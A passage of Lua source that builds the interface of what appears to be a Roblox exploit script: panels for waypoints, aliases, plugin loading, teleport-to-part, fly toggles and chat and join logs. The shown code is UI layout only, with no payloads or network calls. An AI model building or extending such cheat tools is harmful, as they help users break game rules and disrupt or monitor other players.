PositionsFrame.Size = UDim2.new(0, 250, 0, 175)
PositionsFrame.Position = UDim2.new(0, 0, 0, 175)
PositionsFrame.ZIndex = 10
table.insert(shade1, PositionsFrame)
Close_3.Name = "Close"
Close_3.Parent = PositionsFrame
Close_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Close_3.BorderSizePixel = 0
Close_3.Position = UDim2.new(0, 205, 0, 150)
Close_3.Size = UDim2.new(0, 40, 0, 20)
Close_3.Font = Enum.Font.SourceSans
Close_3.TextSize = 14
Close_3.Text = "Close"
Close_3.TextColor3 = Color3.new(1, 1, 1)
Close_3.ZIndex = 10
table.insert(shade2, Close_3)
table.insert(text1, Close_3)
Delete_5.Name = "Delete"
Delete_5.Parent = PositionsFrame
Delete_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Delete_5.BorderSizePixel = 0
Delete_5.Position = UDim2.new(0, 50, 0, 150)
Delete_5.Size = UDim2.new(0, 40, 0, 20)
Delete_5.Font = Enum.Font.SourceSans
Delete_5.TextSize = 14
Delete_5.Text = "Clear"
Delete_5.TextColor3 = Color3.new(1, 1, 1)
Delete_5.ZIndex = 10
table.insert(shade2, Delete_5)
table.insert(text1, Delete_5)
Part.Name = "PartGoto"
Part.Parent = PositionsFrame
Part.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Part.BorderSizePixel = 0
Part.Position = UDim2.new(0, 5, 0, 150)
Part.Size = UDim2.new(0, 40, 0, 20)
Part.Font = Enum.Font.SourceSans
Part.TextSize = 14
Part.Text = "Part"
Part.TextColor3 = Color3.new(1, 1, 1)
Part.ZIndex = 10
table.insert(shade2, Part)
table.insert(text1, Part)
Holder_4.Name = "Holder"
Holder_4.Parent = PositionsFrame
Holder_4.BackgroundTransparency = 1
Holder_4.BorderSizePixel = 0
Holder_4.Position = UDim2.new(0, 0, 0, 0)
Holder_4.Selectable = false
Holder_4.Size = UDim2.new(0, 250, 0, 145)
Holder_4.ScrollBarImageColor3 = Color3.fromRGB(78, 78, 79)
Holder_4.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_4.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_4.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_4.ScrollBarThickness = 0
Holder_4.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_4.VerticalScrollBarInset = "Always"
Holder_4.ZIndex = 10
Example_4.Name = "Example"
Example_4.Parent = PositionsFrame
Example_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Example_4.BorderSizePixel = 0
Example_4.Size = UDim2.new(0, 10, 0, 20)
Example_4.Visible = false
Example_4.Position = UDim2.new(0, 0, 0, -5)
Example_4.ZIndex = 10
table.insert(shade2, Example_4)
Text_5.Name = "Text"
Text_5.Parent = Example_4
Text_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Text_5.BorderSizePixel = 0
Text_5.Position = UDim2.new(0, 10, 0, 0)
Text_5.Size = UDim2.new(0, 240, 0, 20)
Text_5.Font = Enum.Font.SourceSans
Text_5.TextSize = 14
Text_5.Text = "Position"
Text_5.TextColor3 = Color3.new(1, 1, 1)
Text_5.TextXAlignment = Enum.TextXAlignment.Left
Text_5.ZIndex = 10
table.insert(shade2, Text_5)
table.insert(text1, Text_5)
Delete_6.Name = "Delete"
Delete_6.Parent = Text_5
Delete_6.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Delete_6.BorderSizePixel = 0
Delete_6.Position = UDim2.new(0, 200, 0, 0)
Delete_6.Size = UDim2.new(0, 40, 0, 20)
Delete_6.Font = Enum.Font.SourceSans
Delete_6.TextSize = 14
Delete_6.Text = "Delete"
Delete_6.TextColor3 = Color3.new(0, 0, 0)
Delete_6.ZIndex = 10
table.insert(shade3, Delete_6)
table.insert(text2, Delete_6)
TP.Name = "TP"
TP.Parent = Text_5
TP.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
TP.BorderSizePixel = 0
TP.Position = UDim2.new(0, 155, 0, 0)
TP.Size = UDim2.new(0, 40, 0, 20)
TP.Font = Enum.Font.SourceSans
TP.TextSize = 14
TP.Text = "Goto"
TP.TextColor3 = Color3.new(0, 0, 0)
TP.ZIndex = 10
table.insert(shade3, TP)
table.insert(text2, TP)
AliasesFrame.Name = "AliasesFrame"
AliasesFrame.Parent = Settings
AliasesFrame.Active = true
AliasesFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
AliasesFrame.BorderSizePixel = 0
AliasesFrame.Position = UDim2.new(0, 0, 0, 175)
AliasesFrame.Size = UDim2.new(0, 250, 0, 175)
AliasesFrame.ZIndex = 10
table.insert(shade1, AliasesFrame)
Close_2.Name = "Close"
Close_2.Parent = AliasesFrame
Close_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Close_2.BorderSizePixel = 0
Close_2.Position = UDim2.new(0, 205, 0, 150)
Close_2.Size = UDim2.new(0, 40, 0, 20)
Close_2.Font = Enum.Font.SourceSans
Close_2.TextSize = 14
Close_2.Text = "Close"
Close_2.TextColor3 = Color3.new(1, 1, 1)
Close_2.ZIndex = 10
table.insert(shade2, Close_2)
table.insert(text1, Close_2)
Delete_3.Name = "Delete"
Delete_3.Parent = AliasesFrame
Delete_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Delete_3.BorderSizePixel = 0
Delete_3.Position = UDim2.new(0, 5, 0, 150)
Delete_3.Size = UDim2.new(0, 40, 0, 20)
Delete_3.Font = Enum.Font.SourceSans
Delete_3.TextSize = 14
Delete_3.Text = "Clear"
Delete_3.TextColor3 = Color3.new(1, 1, 1)
Delete_3.ZIndex = 10
table.insert(shade2, Delete_3)
table.insert(text1, Delete_3)
Holder_3.Name = "Holder"
Holder_3.Parent = AliasesFrame
Holder_3.BackgroundTransparency = 1
Holder_3.BorderSizePixel = 0
Holder_3.Position = UDim2.new(0, 0, 0, 0)
Holder_3.Size = UDim2.new(0, 250, 0, 145)
Holder_3.ScrollBarImageColor3 = Color3.fromRGB(78, 78, 79)
Holder_3.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_3.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_3.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_3.ScrollBarThickness = 0
Holder_3.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_3.VerticalScrollBarInset = "Always"
Holder_3.ZIndex = 10
Example_3.Name = "Example"
Example_3.Parent = AliasesFrame
Example_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Example_3.BorderSizePixel = 0
Example_3.Size = UDim2.new(0, 10, 0, 20)
Example_3.Visible = false
Example_3.ZIndex = 10
table.insert(shade2, Example_3)
Text_4.Name = "Text"
Text_4.Parent = Example_3
Text_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Text_4.BorderSizePixel = 0
Text_4.Position = UDim2.new(0, 10, 0, 0)
Text_4.Size = UDim2.new(0, 240, 0, 20)
Text_4.Font = Enum.Font.SourceSans
Text_4.TextSize = 14
Text_4.Text = "honk"
Text_4.TextColor3 = Color3.new(1, 1, 1)
Text_4.TextXAlignment = Enum.TextXAlignment.Left
Text_4.ZIndex = 10
table.insert(shade2, Text_4)
table.insert(text1, Text_4)
Delete_4.Name = "Delete"
Delete_4.Parent = Text_4
Delete_4.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Delete_4.BorderSizePixel = 0
Delete_4.Position = UDim2.new(0, 200, 0, 0)
Delete_4.Size = UDim2.new(0, 40, 0, 20)
Delete_4.Font = Enum.Font.SourceSans
Delete_4.TextSize = 14
Delete_4.Text = "Delete"
Delete_4.TextColor3 = Color3.new(0, 0, 0)
Delete_4.ZIndex = 10
table.insert(shade3, Delete_4)
table.insert(text2, Delete_4)
PluginsFrame.Name = "PluginsFrame"
PluginsFrame.Parent = Settings
PluginsFrame.Active = true
PluginsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
PluginsFrame.BorderSizePixel = 0
PluginsFrame.Position = UDim2.new(0, 0, 0, 175)
PluginsFrame.Size = UDim2.new(0, 250, 0, 175)
PluginsFrame.ZIndex = 10
table.insert(shade1, PluginsFrame)
Close_4.Name = "Close"
Close_4.Parent = PluginsFrame
Close_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Close_4.BorderSizePixel = 0
Close_4.Position = UDim2.new(0, 205, 0, 150)
Close_4.Size = UDim2.new(0, 40, 0, 20)
Close_4.Font = Enum.Font.SourceSans
Close_4.TextSize = 14
Close_4.Text = "Close"
Close_4.TextColor3 = Color3.new(1, 1, 1)
Close_4.ZIndex = 10
table.insert(shade2, Close_4)
table.insert(text1, Close_4)
Add_3.Name = "Add"
Add_3.Parent = PluginsFrame
Add_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Add_3.BorderSizePixel = 0
Add_3.Position = UDim2.new(0, 5, 0, 150)
Add_3.Size = UDim2.new(0, 40, 0, 20)
Add_3.Font = Enum.Font.SourceSans
Add_3.TextSize = 14
Add_3.Text = "Add"
Add_3.TextColor3 = Color3.new(1, 1, 1)
Add_3.ZIndex = 10
table.insert(shade2, Add_3)
table.insert(text1, Add_3)
Holder_5.Name = "Holder"
Holder_5.Parent = PluginsFrame
Holder_5.BackgroundTransparency = 1
Holder_5.BorderSizePixel = 0
Holder_5.Position = UDim2.new(0, 0, 0, 0)
Holder_5.Selectable = false
Holder_5.Size = UDim2.new(0, 250, 0, 145)
Holder_5.ScrollBarImageColor3 = Color3.fromRGB(78, 78, 79)
Holder_5.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_5.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_5.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_5.ScrollBarThickness = 0
Holder_5.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_5.VerticalScrollBarInset = "Always"
Holder_5.ZIndex = 10
Example_5.Name = "Example"
Example_5.Parent = PluginsFrame
Example_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Example_5.BorderSizePixel = 0
Example_5.Size = UDim2.new(0, 10, 0, 20)
Example_5.Visible = false
Example_5.ZIndex = 10
table.insert(shade2, Example_5)
Text_6.Name = "Text"
Text_6.Parent = Example_5
Text_6.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Text_6.BorderSizePixel = 0
Text_6.Position = UDim2.new(0, 10, 0, 0)
Text_6.Size = UDim2.new(0, 240, 0, 20)
Text_6.Font = Enum.Font.SourceSans
Text_6.TextSize = 14
Text_6.Text = "F4 > Toggle Fly"
Text_6.TextColor3 = Color3.new(1, 1, 1)
Text_6.TextXAlignment = Enum.TextXAlignment.Left
Text_6.ZIndex = 10
table.insert(shade2, Text_6)
table.insert(text1, Text_6)
Delete_7.Name = "Delete"
Delete_7.Parent = Text_6
Delete_7.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Delete_7.BorderSizePixel = 0
Delete_7.Position = UDim2.new(0, 200, 0, 0)
Delete_7.Size = UDim2.new(0, 40, 0, 20)
Delete_7.Font = Enum.Font.SourceSans
Delete_7.TextSize = 14
Delete_7.Text = "Delete"
Delete_7.TextColor3 = Color3.new(0, 0, 0)
Delete_7.ZIndex = 10
table.insert(shade3, Delete_7)
table.insert(text2, Delete_7)
PluginEditor.Name = randomString()
PluginEditor.Parent = PARENT
PluginEditor.BorderSizePixel = 0
PluginEditor.Active = true
PluginEditor.BackgroundTransparency = 1
PluginEditor.Position = UDim2.new(0.5, -180, 0, -500)
PluginEditor.Size = UDim2.new(0, 360, 0, 20)
PluginEditor.ZIndex = 10
background_3.Name = "background"
background_3.Parent = PluginEditor
background_3.Active = true
background_3.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
background_3.BorderSizePixel = 0
background_3.Position = UDim2.new(0, 0, 0, 20)
background_3.Size = UDim2.new(0, 360, 0, 160)
background_3.ZIndex = 10
table.insert(shade1, background_3)
Dark_2.Name = "Dark"
Dark_2.Parent = background_3
Dark_2.Active = true
Dark_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Dark_2.BorderSizePixel = 0
Dark_2.Position = UDim2.new(0, 222, 0, 0)
Dark_2.Size = UDim2.new(0, 2, 0, 160)
Dark_2.ZIndex = 10
table.insert(shade2, Dark_2)
Img.Name = "Img"
Img.Parent = background_3
Img.BackgroundTransparency = 1
Img.Position = UDim2.new(0, 242, 0, 3)
Img.Size = UDim2.new(0, 100, 0, 95)
Img.Image = "rbxassetid://4113050383"
Img.ZIndex = 10
AddPlugin.Name = "AddPlugin"
AddPlugin.Parent = background_3
AddPlugin.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
AddPlugin.BorderSizePixel = 0
AddPlugin.Position = UDim2.new(0, 235, 0, 100)
AddPlugin.Size = UDim2.new(0, 115, 0, 50)
AddPlugin.Font = Enum.Font.SourceSans
AddPlugin.TextSize = 14
AddPlugin.Text = "Add Plugin"
AddPlugin.TextColor3 = Color3.new(1, 1, 1)
AddPlugin.ZIndex = 10
table.insert(shade2, AddPlugin)
table.insert(text1, AddPlugin)
FileName.Name = "FileName"
FileName.Parent = background_3
FileName.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
FileName.BorderSizePixel = 0
FileName.Position = UDim2.new(0.028, 0, 0.625, 0)
FileName.Size = UDim2.new(0, 200, 0, 50)
FileName.Font = Enum.Font.SourceSans
FileName.TextSize = 14
FileName.Text = "Plugin File Name"
FileName.TextColor3 = Color3.new(1, 1, 1)
FileName.ZIndex = 10
table.insert(shade2, FileName)
table.insert(text1, FileName)
About.Name = "About"
About.Parent = background_3
About.BackgroundTransparency = 1
About.BorderSizePixel = 0
About.Position = UDim2.new(0, 17, 0, 10)
About.Size = UDim2.new(0, 187, 0, 49)
About.Font = Enum.Font.SourceSans
About.TextSize = 14
About.Text = "Plugins are .iy files and should be located in the 'workspace' folder of your exploit."
About.TextColor3 = Color3.fromRGB(255, 255, 255)
About.TextWrapped = true
About.TextYAlignment = Enum.TextYAlignment.Top
About.ZIndex = 10
table.insert(text1, About)
Directions_2.Name = "Directions"
Directions_2.Parent = background_3
Directions_2.BackgroundTransparency = 1
Directions_2.BorderSizePixel = 0
Directions_2.Position = UDim2.new(0, 17, 0, 60)
Directions_2.Size = UDim2.new(0, 187, 0, 49)
Directions_2.Font = Enum.Font.SourceSans
Directions_2.TextSize = 14
Directions_2.Text = "Type the name of the plugin file you want to add below."
Directions_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Directions_2.TextWrapped = true
Directions_2.TextYAlignment = Enum.TextYAlignment.Top
Directions_2.ZIndex = 10
table.insert(text1, Directions_2)
shadow_3.Name = "shadow"
shadow_3.Parent = PluginEditor
shadow_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
shadow_3.BorderSizePixel = 0
shadow_3.Size = UDim2.new(0, 360, 0, 20)
shadow_3.ZIndex = 10
table.insert(shade2, shadow_3)
PopupText_3.Name = "PopupText"
PopupText_3.Parent = shadow_3
PopupText_3.BackgroundTransparency = 1
PopupText_3.Size = UDim2.new(1, 0, 0.95, 0)
PopupText_3.ZIndex = 10
PopupText_3.Font = Enum.Font.SourceSans
PopupText_3.TextSize = 14
PopupText_3.Text = "Add Plugins"
PopupText_3.TextColor3 = Color3.new(1, 1, 1)
PopupText_3.TextWrapped = true
table.insert(text1, PopupText_3)
Exit_3.Name = "Exit"
Exit_3.Parent = shadow_3
Exit_3.BackgroundTransparency = 1
Exit_3.Position = UDim2.new(1, -20, 0, 0)
Exit_3.Size = UDim2.new(0, 20, 0, 20)
Exit_3.Text = ""
Exit_3.ZIndex = 10
ExitImage_3.Parent = Exit_3
ExitImage_3.BackgroundColor3 = Color3.new(1, 1, 1)
ExitImage_3.BackgroundTransparency = 1
ExitImage_3.Position = UDim2.new(0, 5, 0, 5)
ExitImage_3.Size = UDim2.new(0, 10, 0, 10)
ExitImage_3.Image = "rbxassetid://5054663650"
ExitImage_3.ZIndex = 10
AliasHint.Name = "AliasHint"
AliasHint.Parent = AliasesFrame
AliasHint.BackgroundTransparency = 1
AliasHint.BorderSizePixel = 0
AliasHint.Position = UDim2.new(0, 25, 0, 40)
AliasHint.Size = UDim2.new(0, 200, 0, 50)
AliasHint.Font = Enum.Font.SourceSansItalic
AliasHint.TextSize = 16
AliasHint.Text = "Add aliases by using the 'addalias' command"
AliasHint.TextColor3 = Color3.new(1, 1, 1)
AliasHint.TextStrokeColor3 = Color3.new(1, 1, 1)
AliasHint.TextWrapped = true
AliasHint.ZIndex = 10
table.insert(text1, AliasHint)
PluginsHint.Name = "PluginsHint"
PluginsHint.Parent = PluginsFrame
PluginsHint.BackgroundTransparency = 1
PluginsHint.BorderSizePixel = 0
PluginsHint.Position = UDim2.new(0, 25, 0, 40)
PluginsHint.Size = UDim2.new(0, 200, 0, 50)
PluginsHint.Font = Enum.Font.SourceSansItalic
PluginsHint.TextSize = 16
PluginsHint.Text = "Download plugins, Not from the IY Discord, Moon Is a skid"
PluginsHint.TextColor3 = Color3.new(1, 1, 1)
PluginsHint.TextStrokeColor3 = Color3.new(1, 1, 1)
PluginsHint.TextWrapped = true
PluginsHint.ZIndex = 10
table.insert(text1, PluginsHint)
PositionsHint.Name = "PositionsHint"
PositionsHint.Parent = PositionsFrame
PositionsHint.BackgroundTransparency = 1
PositionsHint.BorderSizePixel = 0
PositionsHint.Position = UDim2.new(0, 25, 0, 40)
PositionsHint.Size = UDim2.new(0, 200, 0, 70)
PositionsHint.Font = Enum.Font.SourceSansItalic
PositionsHint.TextSize = 16
PositionsHint.Text = "Use the 'swp' or 'setwaypoint' command to add a position using your character (NOTE: Part teleports will not save)"
PositionsHint.TextColor3 = Color3.new(1, 1, 1)
PositionsHint.TextStrokeColor3 = Color3.new(1, 1, 1)
PositionsHint.TextWrapped = true
PositionsHint.ZIndex = 10
table.insert(text1, PositionsHint)
ToPartFrame.Name = randomString()
ToPartFrame.Parent = PARENT
ToPartFrame.Active = true
ToPartFrame.BackgroundTransparency = 1
ToPartFrame.Position = UDim2.new(0.5, -180, 0, -500)
ToPartFrame.Size = UDim2.new(0, 360, 0, 20)
ToPartFrame.ZIndex = 10
background_4.Name = "background"
background_4.Parent = ToPartFrame
background_4.Active = true
background_4.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
background_4.BorderSizePixel = 0
background_4.Position = UDim2.new(0, 0, 0, 20)
background_4.Size = UDim2.new(0, 360, 0, 117)
background_4.ZIndex = 10
table.insert(shade1, background_4)
ChoosePart.Name = "ChoosePart"
ChoosePart.Parent = background_4
ChoosePart.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
ChoosePart.BorderSizePixel = 0
ChoosePart.Position = UDim2.new(0, 100, 0, 55)
ChoosePart.Size = UDim2.new(0, 75, 0, 30)
ChoosePart.Font = Enum.Font.SourceSans
ChoosePart.TextSize = 14
ChoosePart.Text = "Select Part"
ChoosePart.TextColor3 = Color3.new(1, 1, 1)
ChoosePart.ZIndex = 10
table.insert(shade2, ChoosePart)
table.insert(text1, ChoosePart)
CopyPath.Name = "CopyPath"
CopyPath.Parent = background_4
CopyPath.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
CopyPath.BorderSizePixel = 0
CopyPath.Position = UDim2.new(0, 185, 0, 55)
CopyPath.Size = UDim2.new(0, 75, 0, 30)
CopyPath.Font = Enum.Font.SourceSans
CopyPath.TextSize = 14
CopyPath.Text = "Copy Path"
CopyPath.TextColor3 = Color3.new(1, 1, 1)
CopyPath.ZIndex = 10
table.insert(shade2, CopyPath)
table.insert(text1, CopyPath)
Directions_3.Name = "Directions"
Directions_3.Parent = background_4
Directions_3.BackgroundTransparency = 1
Directions_3.BorderSizePixel = 0
Directions_3.Position = UDim2.new(0, 51, 0, 17)
Directions_3.Size = UDim2.new(0, 257, 0, 32)
Directions_3.Font = Enum.Font.SourceSans
Directions_3.TextSize = 14
Directions_3.Text = "Click on a part and then click the \"Select Part\" button below to set it as a teleport location"
Directions_3.TextColor3 = Color3.new(1, 1, 1)
Directions_3.TextWrapped = true
Directions_3.TextYAlignment = Enum.TextYAlignment.Top
Directions_3.ZIndex = 10
table.insert(text1, Directions_3)
Path.Name = "Path"
Path.Parent = background_4
Path.BackgroundTransparency = 1
Path.BorderSizePixel = 0
Path.Position = UDim2.new(0, 0, 0, 94)
Path.Size = UDim2.new(0, 360, 0, 16)
Path.Font = Enum.Font.SourceSansItalic
Path.TextSize = 14
Path.Text = ""
Path.TextColor3 = Color3.new(1, 1, 1)
Path.TextScaled = true
Path.TextWrapped = true
Path.TextYAlignment = Enum.TextYAlignment.Top
Path.ZIndex = 10
table.insert(text1, Path)
shadow_4.Name = "shadow"
shadow_4.Parent = ToPartFrame
shadow_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
shadow_4.BorderSizePixel = 0
shadow_4.Size = UDim2.new(0, 360, 0, 20)
shadow_4.ZIndex = 10
table.insert(shade2, shadow_4)
PopupText_5.Name = "PopupText"
PopupText_5.Parent = shadow_4
PopupText_5.BackgroundTransparency = 1
PopupText_5.Size = UDim2.new(1, 0, 0.95, 0)
PopupText_5.ZIndex = 10
PopupText_5.Font = Enum.Font.SourceSans
PopupText_5.TextSize = 14
PopupText_5.Text = "Teleport to Part"
PopupText_5.TextColor3 = Color3.new(1, 1, 1)
PopupText_5.TextWrapped = true
table.insert(text1, PopupText_5)
Exit_4.Name = "Exit"
Exit_4.Parent = shadow_4
Exit_4.BackgroundTransparency = 1
Exit_4.Position = UDim2.new(1, -20, 0, 0)
Exit_4.Size = UDim2.new(0, 20, 0, 20)
Exit_4.Text = ""
Exit_4.ZIndex = 10
ExitImage_5.Parent = Exit_4
ExitImage_5.BackgroundColor3 = Color3.new(1, 1, 1)
ExitImage_5.BackgroundTransparency = 1
ExitImage_5.Position = UDim2.new(0, 5, 0, 5)
ExitImage_5.Size = UDim2.new(0, 10, 0, 10)
ExitImage_5.Image = "rbxassetid://5054663650"
ExitImage_5.ZIndex = 10
logs.Name = randomString()
logs.Parent = PARENT
logs.Active = true
logs.BackgroundTransparency = 1
logs.Position = UDim2.new(0, 0, 1, 10)
logs.Size = UDim2.new(0, 338, 0, 20)
logs.ZIndex = 10
shadow.Name = "shadow"
shadow.Parent = logs
shadow.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 338, 0, 20)
shadow.ZIndex = 10
table.insert(shade2, shadow)
Hide.Name = "Hide"
Hide.Parent = shadow
Hide.BackgroundTransparency = 1
Hide.Position = UDim2.new(1, -40, 0, 0)
Hide.Size = UDim2.new(0, 20, 0, 20)
Hide.ZIndex = 10
Hide.Text = ""
ImageLabel.Parent = Hide
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BackgroundTransparency = 1
ImageLabel.Position = UDim2.new(0, 3, 0, 3)
ImageLabel.Size = UDim2.new(0, 14, 0, 14)
ImageLabel.Image = "rbxassetid://2406617031"
ImageLabel.ZIndex = 10
PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Size = UDim2.new(1, 0, 0.949999988, 0)
PopupText.ZIndex = 10
PopupText.Font = Enum.Font.SourceSans
PopupText.FontSize = Enum.FontSize.Size14
PopupText.Text = "Logs"
PopupText.TextColor3 = Color3.new(1, 1, 1)
PopupText.TextWrapped = true
table.insert(text1, PopupText)
Exit.Name = "Exit"
Exit.Parent = shadow
Exit.BackgroundTransparency = 1
Exit.Position = UDim2.new(1, -20, 0, 0)
Exit.Size = UDim2.new(0, 20, 0, 20)
Exit.ZIndex = 10
Exit.Text = ""
ImageLabel_2.Parent = Exit
ImageLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel_2.BackgroundTransparency = 1
ImageLabel_2.Position = UDim2.new(0, 5, 0, 5)
ImageLabel_2.Size = UDim2.new(0, 10, 0, 10)
ImageLabel_2.Image = "rbxassetid://5054663650"
ImageLabel_2.ZIndex = 10
background.Name = "background"
background.Parent = logs
background.Active = true
background.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
background.BorderSizePixel = 0
background.ClipsDescendants = true
background.Position = UDim2.new(0, 0, 1, 0)
background.Size = UDim2.new(0, 338, 0, 245)
background.ZIndex = 10
chat.Name = "chat"
chat.Parent = background
chat.Active = true
chat.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
chat.BorderSizePixel = 0
chat.ClipsDescendants = true
chat.Size = UDim2.new(0, 338, 0, 245)
chat.ZIndex = 10
table.insert(shade1, chat)
Clear.Name = "Clear"
Clear.Parent = chat
Clear.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
Clear.BorderSizePixel = 0
Clear.Position = UDim2.new(0, 5, 0, 220)
Clear.Size = UDim2.new(0, 50, 0, 20)
Clear.ZIndex = 10
Clear.Font = Enum.Font.SourceSans
Clear.FontSize = Enum.FontSize.Size14
Clear.Text = "Clear"
Clear.TextColor3 = Color3.new(1, 1, 1)
table.insert(shade2, Clear)
table.insert(text1, Clear)
SaveChatlogs.Name = "SaveChatlogs"
SaveChatlogs.Parent = chat
SaveChatlogs.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
SaveChatlogs.BorderSizePixel = 0
SaveChatlogs.Position = UDim2.new(0, 258, 0, 220)
SaveChatlogs.Size = UDim2.new(0, 75, 0, 20)
SaveChatlogs.ZIndex = 10
SaveChatlogs.Font = Enum.Font.SourceSans
SaveChatlogs.FontSize = Enum.FontSize.Size14
SaveChatlogs.Text = "Save To .txt"
SaveChatlogs.TextColor3 = Color3.new(1, 1, 1)
table.insert(shade2, SaveChatlogs)
table.insert(text1, SaveChatlogs)
Toggle.Name = "Toggle"
Toggle.Parent = chat
Toggle.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
Toggle.BorderSizePixel = 0
Toggle.Position = UDim2.new(0, 60, 0, 220)
Toggle.Size = UDim2.new(0, 66, 0, 20)
Toggle.ZIndex = 10
Toggle.Font = Enum.Font.SourceSans
Toggle.FontSize = Enum.FontSize.Size14
Toggle.Text = "Disabled"
Toggle.TextColor3 = Color3.new(1, 1, 1)
table.insert(shade2, Toggle)
table.insert(text1, Toggle)
scroll_2.Name = "scroll"
scroll_2.Parent = chat
scroll_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
scroll_2.BorderSizePixel = 0
scroll_2.Position = UDim2.new(0, 5, 0, 25)
scroll_2.Size = UDim2.new(0, 328, 0, 190)
scroll_2.ZIndex = 10
scroll_2.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
scroll_2.CanvasSize = UDim2.new(0, 0, 0, 10)
scroll_2.ScrollBarThickness = 8
scroll_2.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
table.insert(scroll, scroll_2)
table.insert(shade2, scroll_2)
join.Name = "join"
join.Parent = background
join.Active = true
join.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
join.BorderSizePixel = 0
join.ClipsDescendants = true
join.Size = UDim2.new(0, 338, 0, 245)
join.Visible = false
join.ZIndex = 10
table.insert(shade1, join)
Toggle_2.Name = "Toggle"
Toggle_2.Parent = join
Toggle_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
Toggle_2.BorderSizePixel = 0
Toggle_2.Position = UDim2.new(0, 60, 0, 220)
Toggle_2.Size = UDim2.new(0, 66, 0, 20)
Toggle_2.ZIndex = 10
Toggle_2.Font = Enum.Font.SourceSans
Toggle_2.FontSize = Enum.FontSize.Size14
Toggle_2.Text = "Disabled"
Toggle_2.TextColor3 = Color3.new(1, 1, 1)
table.insert(shade2, Toggle_2)
table.insert(text1, Toggle_2)
Clear_2.Name = "Clear"
Clear_2.Parent = join
Clear_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
Clear_2.BorderSizePixel = 0
Clear_2.Position = UDim2.new(0, 5, 0, 220)
Clear_2.Size = UDim2.new(0, 50, 0, 20)
Clear_2.ZIndex = 10
Clear_2.Font = Enum.Font.SourceSans
Clear_2.FontSize = Enum.FontSize.Size14
Clear_2.Text = "Clear"
Clear_2.TextColor3 = Color3.new(1, 1, 1)
table.insert(shade2, Clear_2)
table.insert(text1, Clear_2)
scroll_3.Name = "scroll"
scroll_3.Parent = join
scroll_3.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
scroll_3.BorderSizePixel = 0
scroll_3.Position = UDim2.new(0, 5, 0, 25)
scroll_3.Size = UDim2.new(0, 328, 0, 190)
scroll_3.ZIndex = 10
scroll_3.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
scroll_3.CanvasSize = UDim2.new(0, 0, 0, 10)
scroll_3.ScrollBarThickness = 8
scroll_3.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
table.insert(scroll, scroll_3)
table.insert(shade2, scroll_3)
selectChat.Name = "selectChat"
selectChat.Parent = background
selectChat.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
selectChat.BorderSizePixel = 0
selectChat.Position = UDim2.new(0, 5, 0, 5)
selectChat.Size = UDim2.new(0, 164, 0, 20)
selectChat.ZIndex = 10
selectChat.Font = Enum.Font.SourceSans
selectChat.FontSize = Enum.FontSize.Size14
selectChat.Text = "Chat Logs"
selectChat.TextColor3 = Color3.new(1, 1, 1)
table.insert(shade2, selectChat)
table.insert(text1, selectChat)
selectJoin.Name = "selectJoin"
selectJoin.Parent = background
selectJoin.BackgroundColor3 = Color3.new(0.305882, 0.305882, 0.309804)
